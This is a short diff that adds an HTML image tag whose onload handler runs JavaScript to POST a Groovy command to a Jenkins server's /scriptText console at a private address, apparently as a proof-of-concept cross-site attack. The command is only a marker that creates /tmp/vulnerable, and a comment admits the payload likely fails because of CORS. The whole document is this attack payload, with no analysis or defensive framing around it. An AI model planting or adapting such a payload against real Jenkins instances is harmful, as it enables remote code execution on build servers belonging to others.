@@ -1,0 +1,15 @@
+<img
+    src="https://wiki.jenkins.io/download/attachments/2916393/logo.png?version=1&modificationDate=1302753947000&api=v2"
+    onload="javascript:
+    // this payload likely won't work since CORS
+    var jenkinsIp = '192.168.253.128'
+    var jenkinsPort = 8080
+    var jenkinsUrl = 'http://' + jenkinsIp + ':' + jenkinsPort + '/scriptText';
+    var jenkinsPayload = `script=def command = 'touch /tmp/vulnerable';def proc = command.execute();proc.waitFor();`
+
+    // Construct and send the request
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open('POST', jenkinsUrl, true);
+    xmlHttp.send(jenkinsPayload);
+"
+/>
